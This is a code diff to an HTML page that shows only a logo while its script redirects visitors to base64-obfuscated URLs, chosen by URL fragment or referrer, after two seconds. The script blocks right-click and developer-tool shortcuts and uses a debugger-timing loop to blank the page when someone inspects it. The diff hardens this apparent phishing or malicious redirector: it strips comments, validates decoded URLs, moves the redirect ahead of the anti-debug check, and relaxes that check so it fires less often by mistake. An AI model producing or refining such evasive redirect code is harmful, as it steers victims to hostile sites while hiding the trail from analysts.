@@ -33,12 +33,10 @@
         <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQduXJREqBe_A7tkWoD48jL35xRpT_WaxP_tQ&s" alt="Logo">
     </div>
     <script type="text/javascript">
-        // Anti right-click
         document.addEventListener('contextmenu', function(e) {
             e.preventDefault();
         });
 
-        // Anti F12 and other dev tools shortcuts
         document.addEventListener('keydown', function(e) {
             if (e.keyCode === 123) { e.preventDefault(); return false; }
             if (e.ctrlKey && e.shiftKey && e.keyCode === 73) { e.preventDefault(); return false; }
@@ -47,49 +45,53 @@
             if (e.ctrlKey && e.shiftKey && e.keyCode === 67) { e.preventDefault(); return false; }
         });
 
-        // Anti-debug
-        setInterval(function() {
-            const start = performance.now();
-            debugger;
-            const end = performance.now();
-            if (end - start > 100) {
-                window.location.href = 'about:blank';
-            }
-        }, 1000);
-
         // --- Destination routing by fragment ---
-        // Each entry maps a fragment (without '#') to a base64-encoded URL.
-        // Add more entries as needed.
         var ROUTES = {
-            '1': 'aHR0cHM6Ly9kay5ncnNzeGwubmV0LzZxVnV4a2lV',   // default / #1
-            '2': 'aHR0cHM6Ly9zZW52ZXJvcGUuaWN1L2thbGkvcmVkaXJlYy8='      // #2 -> replace with your real base64
+            '1': 'aHR0cHM6Ly9kay5ncnNzeGwubmV0LzZxVnV4a2lV',
+            '2': 'aHR0cHM6Ly9zZW52ZXJvcGUuaWN1L2thbGkvcmVkaXJlYy8='
         };
 
         function pickDestination() {
-            // Priority 1: current page's own hash (user landed on .../#1 or .../#2)
             var hash = window.location.hash.replace(/^#/, '');
 
-            // Priority 2: if no hash on this page, try to pull it from referrer
-            // (Referrer itself won't carry a fragment, so this is a fallback
-            //  for the case where the referrer URL was passed as a full string
-            //  by some intermediary — rare, but handled.)
             if (!hash && document.referrer) {
                 var refHash = document.referrer.split('#')[1];
                 if (refHash) hash = refHash;
             }
 
-            // Fallback: default route
             if (!hash || !ROUTES[hash]) hash = '1';
 
             try {
-                return atob(ROUTES[hash]);
+                var decoded = atob(ROUTES[hash]);
+                // sanity: must look like a URL
+                if (!/^https?:\/\//i.test(decoded)) {
+                    decoded = atob(ROUTES['1']);
+                }
+                return decoded;
             } catch (err) {
                 return atob(ROUTES['1']);
             }
         }
 
+        // Fire the redirect FIRST, before any anti-debug interval can nuke the page.
+        var destination = pickDestination();
+        // uncomment the next line temporarily if you want to debug in console:
+        // console.log('[route]', window.location.hash, '->', destination);
+
         setTimeout(function() {
-            window.location.href = pickDestination();
+            window.location.replace(destination);
+        }, 2000);
+
+        // Anti-debug interval moved AFTER the redirect is scheduled,
+        // and relaxed so background tabs don't false-positive.
+        setInterval(function() {
+            var start = performance.now();
+            debugger;
+            var end = performance.now();
+            // only nuke if the pause was severe AND we're still on this page
+            if (end - start > 250 && document.visibilityState === 'visible') {
+                window.location.replace('about:blank');
+            }
         }, 2000);
     </script>
 </body>
